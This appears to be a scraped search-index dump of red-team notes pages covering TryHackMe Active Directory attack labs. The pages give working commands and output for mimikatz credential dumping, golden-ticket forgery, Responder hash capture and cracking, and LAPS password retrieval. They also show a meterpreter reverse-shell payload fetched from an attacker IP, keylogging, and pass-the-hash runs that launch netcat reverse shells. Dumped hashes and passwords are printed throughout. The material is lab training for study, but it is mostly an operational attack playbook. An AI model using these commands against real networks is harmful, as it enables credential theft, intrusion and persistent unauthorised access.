distinguishedname : CN=IIS Server,CN=Users,DC=za,DC=tryhackme,DC=loc objectclass : {top, person, organizationalPerson, user} displayname : IIS Server lastlogontimestamp : 11/6/2022 6:03:06 PM userprincipalname : svcIIS@za.tryhackme.loc name : IIS Server objectsid : S-1-5-21-3885271727-2693558621-2658995185-6155 samaccountname : svcIIS codepage : 0 samaccounttype : USER_OBJECT accountexpires : NEVER countrycode : 0 whenchanged : 11/6/2022 6:03:06 PM instancetype : 4 usncreated : 78494 objectguid : 11e42287-0a25-4d73-800d-b62e2d2a2a4b sn : Server lastlogoff : 1/1/1601 12:00:00 AM msds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc, http/THMSERVER1} objectcategory : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc dscorepropagationdata : 1/1/1601 12:00:00 AM serviceprincipalname : HTTP/svcServWeb.za.tryhackme.loc givenname : IIS lastlogon : 11/7/2022 3:14:12 PM badpwdcount : 0 cn : IIS Server useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION whencreated : 4/27/2022 11:26:21 AM primarygroupid : 513 pwdlastset : 4/29/2022 11:50:25 AM usnchanged : 147565 There is only one user allowed to act as a delegate for other users, namely svcIIS@za.tryhackme.loc . This account is allowed to delegate access to WSMAN/THMSERVER1.za.tryhackme.loc and http/THMSERVER1.za.tryhackme.loc . PS C:\\Users\\t2_alan.riley> Get-CimInstance -ClassName Win32_Service | Where-Object {$_.StartName -like 'svcIIS*'} | Select-Object * Name : thmwinauth Status : OK ExitCode : 0 DesktopInteract : False ErrorControl : Normal PathName : C:\\Windows\\system32.cmd.exe ServiceType : Own Process StartMode : Auto Caption : thmwinauth Description : InstallDate : CreationClassName : Win32_Service Started : False SystemCreationClassName : Win32_ComputerSystem SystemName : THMWRK1 AcceptPause : False AcceptStop : False DisplayName : thmwinauth ServiceSpecificExitCode : 0 StartName : svcIIS@za.tryhackme.loc State : Stopped TagId : 0 CheckPoint : 0 DelayedAutoStart : True ProcessId : 0 WaitHint : 0 PSComputerName : CimClass : root/cimv2:Win32_Service CimInstanceProperties : {Caption, Description, InstallDate, Name...} CimSystemProperties : Microsoft.Management.Infrastructure.CimSystemProperties At system startup, the svcIIS account will auto-start a service which executes C:\\Windows\\system32.cmd.exe . That spawns a command prompt and causes the credential to be cached in memory. Dumping secrets with mimikatz  token::elevate - To dump the secrets from the registry hive, we need to impersonate the SYSTEM user. lsadump::secrets - Mimikatz interacts with the registry hive to pull the clear text credentials. PS C:\\Users\\t2_alan.riley> C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz # privilege::debug Privilege '20' OK mimikatz # token::elevate Token Id : 0 User name : SID name : NT AUTHORITY\\SYSTEM 488 {0;000003e7} 1 D 17781 NT AUTHORITY\\SYSTEM S-1-5-18 (04g,21p) Primary -> Impersonated ! * Process Token : {0;002e7dc8} 5 D 3496925 ZA\\t2_alan.riley S-1-5-21-3885271727-2693558621-2658995185-5243 (14g,24p) Primary * Thread Token : {0;000003e7} 1 D 3528379 NT AUTHORITY\\SYSTEM S-1-5-18 (04g,21p) Impersonation (Delegation) mimikatz # lsadump::secrets Domain : THMWRK1 SysKey : a1403e57976b472bce5f231922ca3942 Local name : THMWRK1 ( S-1-5-21-3226461851-763325627-4205969673 ) Domain name : ZA ( S-1-5-21-3885271727-2693558621-2658995185 ) Domain FQDN : za.tryhackme.loc Policy subsystem is : 1.18 LSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463 Secret : $MACHINE.ACC cur/text: 0FFIKa\"c[#L6T>=.s*ZW'Gz04FL&7,\"VjxxhLeXqmI\\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP NTLM:4207d1b7e4b942da2371174b772fdf5e SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db old/text: 0FFIKa\"c[#L6T>=.s*ZW'Gz04FL&7,\"VjxxhLeXqmI\\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP NTLM:4207d1b7e4b942da2371174b772fdf5e SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db Secret : DefaultPassword old/text: vagrant Secret : DPAPI_SYSTEM cur/hex : 01 00 00 00 b6 54 c4 83 d9 88 10 f6 ee ae fc b7 ed 2d a2 d6 47 11 3f 8f 4a 6d 7f 72 35 b8 a2 93 3d 5c 5e 3f 03 8d 79 49 90 e7 2e e0 full: b654c483d98810f6eeaefcb7ed2da2d647113f8f4a6d7f7235b8a2933d5c5e3f038d794990e72ee0 m/u : b654c483d98810f6eeaefcb7ed2da2d647113f8f /...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ce606a6171251c67154dde0b1168722e",
    "u": "https://ad.tymyrddin.dev/docs/pivot/setup",
    "t": "Setup for THM AD ",
    "c": "Setup for THM AD  Download the vpn config file from THM, and use it to configure sudo openvpn --config ./<username>-lateralmovementandpivoting.ovpn --daemon Check PID (you get a number, if not, doesn’t work): sudo ps aux | grep -v grep | grep -i <username>-lateralmovementandpivoting | awk -v FS=' ' '{print $2}' Set your DNS IPv4 to the IP address of the THMDC in the network diagram, and run: sudo systemctl restart NetworkManager Test: nslookup thmdc.za.tryhackme.com Go to http://distributor.za.tryhackme.com/creds and request your credentials for SSH access to thmjmp2 . Login with ssh : $ ssh username@za.tryhackme.com@thmjmp2.za.tryhackme.com",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "629c206db1ac1b6cf9a435dc8000dc6e",
    "u": "https://ad.tymyrddin.dev/docs/enum/cmd",
    "t": "Through Command Prompt ",
    "c": "Through Command Prompt  Run on a domain-joined host to enumerate domain users: net user /domain Run on a domain-joined host to get information about a specific domain user: net user user.name /domain Run on a domain-joined host to enumerate domain groups: net group /domain Run on a domain-joined host to get information about a specific domain group: net group groupName /domain Run on a domain-joined host to show the domain password and account lockout policy: net accounts /domain",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "7a928cd69896bf5d1d529eb9df3d2fc7",
    "u": "https://ad.tymyrddin.dev/docs/harvest/laps",
    "t": "Local Administrator Password Solution ",
    "c": "Local Administrator Password Solution  GPP is a tool that allows administrators to create domain policies with embedded credentials. Once the GPP is deployed, different XML files are created in the SYSVOL folder. SYSVOL is an essential component of Active Directory and creates a shared directory on an NTFS volume that all authenticated domain users can access with reading permission. Once upon a time, the GPP relevant XML files contained a password encrypted using AES-256 bit encryption. At that time, the encryption was good enough until Microsoft somehow published its private key on MSDN . And because Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords. One of the tools to crack the SYSVOL encrypted password is Get-GPPPassword . In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password. The new method includes two new attributes ( ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime ) of computer objects in the Active Directory. The ms-mcs-AdmPwd attribute contains a clear-text password of the local administrator, while the ms-mcs-AdmPwdExpirationTime contains the expiration time to reset the password. LAPS uses admpwd.dll to change the local administrator password and update the value of ms-mcs-AdmPwd . Enumerating for LAPS: Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Users\\thm>dir \"C:\\Program Files\\LAPS\\CSE\" Volume in drive C has no label. Volume Serial Number is A8A4-C362 Directory of C:\\Program Files\\LAPS\\CSE 06/06/2022 01:01 PM <DIR> . 06/06/2022 01:01 PM <DIR> .. 05/05/2021 07:04 AM 184,232 AdmPwd.dll 1 File(s) 184,232 bytes 2 Dir(s) 10,184,249,344 bytes free Switch: C:\\Users\\thm>powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Listing the available PowerShell cmdlets for LAPS: PS C:\\Users\\thm> Get-Command *AdmPwd* CommandType Name Version Source ----------- ---- ------- ------ Cmdlet Find-AdmPwdExtendedRights 5.0.0.0 AdmPwd.PS Cmdlet Get-AdmPwdPassword 5.0.0.0 AdmPwd.PS Cmdlet Reset-AdmPwdPassword 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdAuditing 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdComputerSelfPermission 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdReadPasswordPermission 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdResetPasswordPermission 5.0.0.0 AdmPwd.PS Cmdlet Update-AdmPwdADSchema 5.0.0.0 AdmPwd.PS Finding Users with AdmPwdExtendedRights Attribute: PS C:\\Users\\thm> Find-AdmPwdExtendedRights -Identity THMorg ObjectDN ExtendedRightHolders -------- -------------------- OU=THMorg,DC=thm,DC=red {THM\\LAPsReader} Finding Users belong to THMLAPsReader Group: PS C:\\Users\\thm> net groups \"LAPsReader\" Group name LAPsReader Comment Members ------------------------------------------------------------------------------- bk-admin The command completed successfully. Info: PS C:\\Users\\thm> net user bk-admin User name bk-admin Full Name THM Admin BK Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 6/4/2022 10:33:48 AM Password expires Never Password changeable 6/5/2022 10:33:48 AM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 6/9/2022 3:47:28 PM Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users *Domain Admins *LAPsReader *Enterprise Admins The command completed successfully. Switch to bk-admin : PS C:\\Users\\thm> runas /savecred /user:THM.red\\bk-admin cmd.exe Attempting to start cmd.exe as user \"THM.red\\bk-admin\" ... Enter the password for THM.red\\bk-admin: Attempting to start cmd.exe as user \"THM.red\\bk-admin\" ... PS C:\\Users\\thm> Get password: Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32> Get-AdmPwdPassword -ComputerName creds-harvestin ComputerName DistinguishedName Password ExpirationTimestamp ------------ ----------------- -------- ------------------- CREDS-HARVESTIN CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red THMLAPSPassw0rd 2/11/2338 11:05:2... PS C:\\Windows\\system32>",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "0d74c40a23f2a3d60c8bf77be687ba09",
    "u": "https://ad.tymyrddin.dev/docs/exploit/users",
    "t": "Exploiting AD users ",
    "c": "Exploiting AD users  Users are, unfortunately, often the weakest link in the security chain. Just think about weak passwords and bad habits, such as granting overly permissive permissions. It would be ignorant and ineffective to overlook this attack surface: Credential Management - How users store their credentials. In AD, this is quite important since users may have multiple sets of credentials and remembering all of them can be a hassle. Keylogging - Often, during exploitation, we need to understand how normal users interact with a system. Together with screengrabs, keylogging can be a useful tool to gain this understanding from an attacker’s perspective. Using our WinRM shell from Kerberos delegation , we do some post-exploit enumeration and come across a .kdbx file in C:\\Users\\trevor.local\\Documents . It’s likely a password vault that’s been encrypted with a strong password. Payload  Generate a meterpreter payload: msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.50.57.175 LPORT=443 -f psh -o pwn.ps1 Start a listener: sudo msfconsole msf6> use exploit/multi/handler msf6> set payload windows/x64/meterpreter_reverse_tcp msf6> set LHOST kali-vpn-ip msf6> set LPORT 443 msf6> run Transfer the payload to the target  Start a Python web server on Kali: sudo python3 -m http.server 80 Download the file onto THMSERVER1 via the WinRM session and execute it: powershell.exe -ep bypass Create a web client object: $wc = New-Object Net.WebClient Download pwn.ps1 from Kali and save it in the current directory: $wc. DownloadFile('http://10.50.57.175/pwn.ps1', \"$PWD\\pwn.ps1\") .\\pwn.ps1 Start the keylogger meterpreter > keyscan_start Dump captured keystrokes meterpreter > keyscan_dump Stop the keylogger meterpreter > keyscan_stop Get flag  sudo apt install -y kpcli kpcli # Password is: Imreallysurenoonewillguessmypassword kpcli:/> open PasswordDatabase.kdbx kpcli:/> ls kpcli:/> ls PasswordDatabase/* kpcli:/> show -f -a PasswordDatabase/General/Flag THM{AD.Users.Can.Give.Up.Good.Secrets} kpcli:/> show -f -a PasswordDatabase/General/svcServMan Sup3rStr0ngPass!@",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "bb9c45c228e7f478e7987c9ee2f05fa1",
    "u": "https://ad.tymyrddin.dev/docs/persist/setup",
    "t": "Setup for THM AD ",
    "c": "Setup for THM AD  Connecting to the network  Download the vpn config file from THM, and use it to configure sudo openvpn --config ./<some assigned code>-persistingad.ovpn --daemon Check PID (you get a number, if not, does not work): sudo ps aux | grep -v grep | grep -i <some assigned code>-persistingad.ovpn | awk -v FS=' ' '{print $2}' Edit DNS configuration  Set your DNS IPv4 to the IP address of the THMCHILDDC in the network diagram (also add 1.1.1.1 for connections to the internet) and run: sudo systemctl restart NetworkManager Test hostname lookups  $ dig thmdc.za.tryhackme.loc ; <<>> DiG 9.18.7-1-Debian <<>> thmdc.za.tryhackme.loc ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 468 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;thmdc.za.tryhackme.loc. IN A ;; ANSWER SECTION: thmdc.za.tryhackme.loc. 1200 IN A 10.200.60.101 ;; Query time: 40 msec ;; SERVER: 10.200.60.101#53(10.200.60.101) (UDP) ;; WHEN: Mon Nov 07 14:15:34 GMT 2022 ;; MSG SIZE rcvd: 67 And: $ nslookup google.com ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out Server: 1.1.1.1 Address: 1.1.1.1#53 Non-authoritative answer: Name: google.com Address: 216.58.214.78 ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out Name: google.com Address: 2a00:1450:4007:818::200e Request credentials  Get your credentials from http://distributor.za.tryhackme.loc/creds . Jump in  You can now either login with ssh , for example: $ ssh za.tryhackme.loc\\\\<AD Username>@thmwrk1.za.tryhackme.loc Or by RDP: $ xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'<AD Username>' /p:'<AD Password>'",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "f9020acb7943bcc7fc068fb8d2a10965",
    "u": "https://ad.tymyrddin.dev/docs/breach/relays",
    "t": "Authentication relays ",
    "c": "Authentication relays  In Windows networks, there are a significant amount of services talking to each other, allowing users to make use of the services provided by the network. These services use built-in authentication methods to verify the identity of incoming connections, such as NTLM Authentication used on a web application. This is a dive into NetNTLM authentication used by SMB. Download the password list to be used for cracking the NetNTLM hash. Server Message Block  Used by Windows (and Linux) systems to facilitate file sharing, remote administration, etc. Newer versions of the SMB protocol resolve some vulnerabilities, but companies with legacy systems continue to use older versions. SMB communications are not encrypted and can be intercepted. LLMNR, NBT-NS, and WPAD  NBT-NS and LLMNR are ways to resolve hostnames to IP addresses on the LAN. WPAD is a way for Windows hosts to auto-discover web proxies. These protocols are broadcast on the LAN and can therefore be poisoned, tricking hosts into thinking they’re talking with the intended target. Since these are layer 2 protocols, any time we use Responder to capture and poison requests, we must be on the same LAN as the target. Intercepting NetNTLM challenge  Edit the Responder configuration file and make sure the SMB and HTTP servers are set to On : sudo nano /etc/responder/Responder.conf [Responder Core] ; Servers to start SQL = Off SMB = On RDP = Off Kerberos = On FTP = On POP = Off SMTP = Off IMAP = Off HTTP = On HTTPS = Off DNS = Off LDAP = On DCERPC = Off WINRM = Off Run Responder and wait for the client to connect (A simulated host runs every 30 minutes): sudo responder -I tun0 Crack the hash: echo 'svcFileCopy::ZA:7cc90fae8c5d340dhash john --wordlist=./passwordlist.txt hash",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "68e005fbe33646a25d21d2a3f00dfa93",
    "u": "https://ad.tymyrddin.dev/docs/persist/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Persisting Active Directory What?  Common Active Directory persistence techniques. Why?  To ensure the blue team will not be able to kick us out during a red team exercise. How?  Setup for THM AD Persistence through credentials Persistence through tickets Persistence through certificates Persistence through SID history Persistence through group membership Persistence through ACLs Persistence through GPOs",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "feb315577473173cbba9c06cff96561b",
    "u": "https://ad.tymyrddin.dev/docs/persist/tickets",
    "t": "Persistence through tickets ",
    "c": "Persistence through tickets  Kerberos authentication flow  Ticket Granting Ticket: As long as the session has not lapsed, the user can reuse the TGT as often as needed to request a TGS. Ticket Granting Service: The TGS also has a service session key, and when the SP decrypts the ticket, the SP will have a session key for the user. User Authentication: Deny/Allow Pass-the-Ticket requires both the ticket and the service session key in order to pass a TGS to a service principal to authenticate as a user. A TGT (Golden ticket) allows an attacker to request multiple TGSs (Silver tickets) on behalf of a user. When a user requests a TGS, they send an encrypted timestamp derived from their password. The algorithm used to create this key can be DES (disabled by default on newer Windows installations), RC4 , AES218 , or AES256 , and can perhaps be extracted using mimikatz . If any of these keys are available on the host, then we can try to request a TGT as the user the Pass-the-Key way. The RC4 hash is equal to a user’s NTLM hash. If a users’ NTLM hashes were dumped from LSASS during enumeration on a domain-joined host, and RC4 a valid encryption algorithm, then these are RC4 hashes, which could be used to request a TGT the Overpass-the-Hash way. Golden Tickets  Golden Tickets are forged TGTs. What this means is we bypass steps 1 and 2 of the diagram above, where we prove to the DC who we are. Having a valid TGT of a privileged account, we can now request a TGS for almost any service we want. In order to forge a golden ticket, we need the krbtg account’s password hash so that we can sign a TGT for any user account we want. Some interesting notes about Golden Tickets: By injecting at this stage of the Kerberos process, we don’t need the password hash of the account we want to impersonate since we bypass that step. The TGT is only used to prove that the KDC on a DC signed it. Since it was signed by the krbtg hash, this verification passes and the TGT is declared valid no matter its contents. Speaking of contents, the KDC will only validate the user account specified in the TGT if it is older than 20 minutes. This means we can put a disabled, deleted, or non-existent account in the TGT, and it will be valid as long as we ensure the timestamp is not older than 20 minutes. Since the policies and rules for tickets are set in the TGT itself, we could overwrite the values pushed by the KDC, such as, for example, that tickets should only be valid for 10 hours. We could, for instance, ensure that our TGT is valid for 10 years, granting us persistence. By default, the krbtg account’s password never changes, meaning once we have it, unless it is manually rotated, we have persistent access by generating TGTs forever. The blue team would have to rotate the krbtg account’s password twice, since the current and previous passwords are kept valid for the account. This is to ensure that accidental rotation of the password does not impact services. Rotating the krbtg account’s password is an incredibly painful process for the blue team since it will cause a significant amount of services in the environment to stop working. They think they have a valid TGT, sometimes for the next couple of hours, but that TGT is no longer valid. Not all services are smart enough to release the TGT is no longer valid (since the timestamp is still valid) and thus won’t auto-request a new TGT. Golden tickets would even allow you to bypass smart card authentication, since the smart card is verified by the DC before it creates the TGT. We can generate a golden ticket on any machine, even one that is not domain-joined (such as our own attack machine), making it harder for the blue team to detect. Apart from the krbtg account’s password hash, we only need the domain name, domain SID, and user ID for the person we want to impersonate. If we are in a position where we can recover the krbtg account’s password hash, we would already be in a position where we can recover the other pieces of the required information. Silver Tickets  Silver Tickets are forged TGS tickets. So now, we skip all communication (Step 1-4 in the diagram above) we would have had with the KDC on the DC and just interface with the service we want access to directly. Some interesting notes about Silver Tickets: The generated TGS is signed by the machine account of the host we are targeting. The main difference between Golden and Silver Tickets is the number of privileges we acquire. If we have the krbtg account’s password hash, we can get access to everything. With a Silver Ticket, since we only have access to the password hash of the machine account of the server we are attacking, we can only impersonate users on that host itself. The Silver Ticket’s scope is limited to whatever service is targeted on the specific server. Since the TGS is forged, there is no associated TGT, meaning the DC was never contacted. This makes the attack incredibly dangerous since the only available logs would be on the targeted server. So while the scope is more limited, it is significantly harder for the blue team to detect. Since permissions are determined through SIDs, we can again create a non-existing user for our silver ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host’s local administrators group. The machine account’s password is usually rotated every 30 days, which would not be good for persistence. However, we could leverage the access our TGS provides to gain access to the host’s registry and alter the parameter that is responsible for the password rotation of the machine account. Thereby ensuring the machine account remains static and granting us persistence on the machine. While only having access to a single host might seem like a significant downgrade, machine accounts can be used as normal AD accounts, allowing you not only administrative access to the host but also the means to continue enumerating and exploiting AD as you would with an AD user account. Forging tickets  SSH to THMWRK1 with the unprivileged user account from the distributor. ssh user.name@za.tryhackme.loc@thmwrk1.za.tryhackme.loc Start a powershell: powershell.exe -ep bypass Get the domain context: PS C:\\Users\\Administrator.ZA> Get-ADDomain AllowedDNSSuffixes : {} ComputersContainer : CN=Computers,DC=za,DC=tryhackme,DC=loc DeletedObjectsContainer : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc DistinguishedName : DC=za,DC=tryhackme,DC=loc DNSRoot : za.tryhackme.loc DomainControllersContainer : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc DomainMode : Windows2012R2Domain DomainSID : S-1-5-21-3885271727-2693558621-2658995185 ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=tryhackme,DC=loc Forest : tryhackme.loc InfrastructureMaster : THMDC.za.tryhackme.loc LastLogonReplicationInterval : LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=za,DC=tryhackme,DC=loc} LostAndFoundContainer : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc ManagedBy : Name : za NetBIOSName : ZA ObjectClass : domainDNS ObjectGUID : 1fc9e299-da51-4d03-baa0-862c3360c0b2 ParentDomain : tryhackme.loc PDCEmulator : THMDC.za.tryhackme.loc PublicKeyRequiredPasswordRolling : QuotasContainer : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc ReadOnlyReplicaDirectoryServers : {} ReplicaDirectoryServers : {THMDC.za.tryhackme.loc} RIDMaster : THMDC.za.tryhackme.loc SubordinateReferences : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc} SystemsContainer : CN=System,DC=za,DC=tryhackme,DC=loc UsersContainer : CN=Users,DC=za,DC=tryhackme,DC=loc Start Mimikatz: PS C:\\Users\\Administrator.ZA> C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe Forge a golden ticket: mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt We can specify /admin:ReallyNotLegitAccount...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8f2c85994b8acfe244acb309aff51a2f",
    "u": "https://ad.tymyrddin.dev/docs/pivot/auth",
    "t": "Use of alternate authentication material ",
    "c": "Use of alternate authentication material  NTLM authentication flow  This is for domain authentication. In local authentication, this process only occurs between the client and server, as the server keeps the user's NTLM hash in the SAM If an attacker manages to compromise a machine where a domain user is logged in, the attacker may be able to dump the domain user’s NTLM hash from memory by using a tool like mimikatz or other methods. The attacker could try to crack the hash(es) and user passwords. User sends hash (not password). This allows an attacker to authenticate as a user in certain situations without ever needing to know a password, called pass-the-hash . It does require dumping hashes locally or remotely. Kerberos authentication flow  Ticket Granting Ticket: As long as the session has not lapsed, the user can reuse the TGT as often as needed to request a TGS. Ticket Granting Service: The TGS also has a service session key, and when the SP decrypts the ticket, the SP will have a session key for the user. User Authentication: Deny/Allow Pass-the-Ticket requires both the ticket and the service session key in order to pass a TGS to a service principal to authenticate as a user. A TGT (Golden ticket) allows an attacker to request multiple TGSs (Silver tickets) on behalf of a user. When a user requests a TGS, they send an encrypted timestamp derived from their password. The algorithm used to create this key can be DES (disabled by default on newer Windows installations), RC4 , AES218 , or AES256 , and can perhaps be extracted using mimikatz . If any of these keys are available on the host, then we can try to request a TGT as the user the Pass-the-Key way. The RC4 hash is equal to a user’s NTLM hash. If a users’ NTLM hashes were dumped from LSASS during enumeration on a domain-joined host, and RC4 a valid encryption algorithm, then these are RC4 hashes, which could be used to request a TGT the Overpass-the-Hash way. Cracking hashes  As a result of extracting credentials from a host where we have attained administrative privileges, we might get clear-text passwords, or hashes that can be easily cracked. NTLM hash (NTHash)  These hashes can be obtained by dumping the SAM database or using mimikatz . They are also stored on domain controllers in the NTDS file. These are the hashes that can be used to pass-the-hash . Usually people call this the NTLM hash (or just NTLM), which is misleading, as Microsoft refers to this as the NTHash (at least in some places). Example: B4B9B02E6F09A9BD760F388B67351E2B The algorithm: MD4(UTF-16-LE(password)) UTF-16-LE is the little endian UTF-16 . Windows used this instead of the standard big endian. Cracking: john --format=nt hash.txt hashcat -m 1000 -a 3 hash.txt NTLMv1 (Net-NTLMv1) hash  The NTLM protocol uses the NTHash in a challenge/response between a server and a client. The v1 of the protocol uses both the NT and LM hash, depending on configuration and on what is available. A way of obtaining a response to crack from a client, responder can be used. The value to crack would be the K1 | K2 | K3 . Version 1 is deprecated, but might still be used in some old systems on the network. Example u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c The algorithm: C = 8-byte server challenge, random K1 | K2 | K3 = LM/NT-hash | 5-bytes-0 response = DES(K1,C) | DES(K2,C) | DES(K3,C) Cracking: john --format=netntlm hash.txt hashcat -m 5500 -a 3 hash.txt NTLMv2 (Net-NTLMv2) hash  The new and improved version of the NTLM protocol, which makes it a bit harder to crack. The concept is the same as NTLMv1, but a different algorithm and responses are sent to the server. Can also be captured with responder . This is the Default in Windows since Windows 2000. Example: admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030 The algorithm: SC = 8-byte server challenge, random CC = 8-byte client challenge, random CC* = (X, time, CC2, domain name) v2-Hash = HMAC-MD5(NT-Hash, user name, domain name) LMv2 = HMAC-MD5(v2-Hash, SC, CC) NTv2 = HMAC-MD5(v2-Hash, SC, CC*) response = LMv2 | CC | NTv2 | CC* Cracking: john --format=netntlmv2 hash.txt hashcat -m 5600 -a 3 hash.txt Pass-the-hash  The NTLM challenge sent during authentication can be responded to just by knowing the password hash. Instead of having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can pass-the-hash (PtH) for authentication. Assuming NTLMv2, To extract NTLM hashes, use mimikatz to read the local SAM or extract hashes directly from LSASS memory. Extracting NTLM hashes from local SAM will only allow getting hashes from local users on the machine. No domain user hashes will be available. mimikatz # privilege::debug mimikatz # token::elevate mimikatz # lsadump::sam Extracting NTLM hashes from LSASS memory will give any NTLM hashes for local users and any domain user that has recently logged onto the machine. mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::msv The extracted hashes can be used in a PtH attack by using mimikatz to inject an access token for the target user on a reverse shell (or any other command): mimikatz # token::revert mimikatz # sekurlsa::pth /user:<username> /domain:<domainname> /ntlm:6b4a57f67805a663c818106dc0648484 /run:\"c:\\tools\\nc64.exe -e cmd.exe <IP attack machine> 5555\" token::revert reestablishes the original token privileges, because trying to pass-the-hash with an elevated token will not work. Run a reverse listener on the attack machine: nc -lnvp 5555 Running the whoami command on this shell, it will still show the original user from before doing the PtH, but any command run from here will use the credentials thet were injected. Some Linux tools have built-in support for PtH attacks using different protocols. Depending on which services are available, try: Connect to RDP using PtH: xfreerdp /v:<IP target> /u:<domainname>\\\\<username> /pth:<ntlmhash> Connect via psexec using PtH: psexec.py -hashes <ntlmhash> <domainname>/<username>@<IP target> Note: Only the linux version of psexec supports PtH. Connect to WinRM using PtH: evil-winrm -i <IP target> -u <username> -H <ntlmhash> Pass-the-ticket  It may be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz . This usually requires having SYSTEM privileges on the attacked machine: mimikatz # privilege::debug mimikatz # sekurlsa::tickets /export Extracting TGTs will require administrator privileges, and extracting TGSs can be done with a low-privileged account (only the ones assigned to that account). We need the ticket and its corresponding session key. Inject the ticket into the current session: mimikatz # kerberos::ptt <ticket> Where ticket looks something like: [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi Injecting tickets in our own session does not require administrator privileges. After this, the tickets will be available for any tools used for lateral movement. To check if the tickets were correctly injected, exit out of the mimikatz session and: za\\user.name@THMJMP2 C:\\> klist Overpass-the-hash/Pass-the-key  This attack is similar to PtH but then for Kerberos networks. Obtain the Kerberos encryption keys from memory with mimikatz: mimikatz # privilege::debug mimikatz # sekurlsa::ekeys Get a reverse shell. Depending on the available keys: RC4: mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:\"c:\\tools\\nc64.exe -e cmd.exe <IP attack machine> 5556\" AES128 hash: mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:\"c:\\tools\\nc64.exe -e cmd.exe <IP attack machine> 5556\" If we have the AES256 hash: mimikatz # 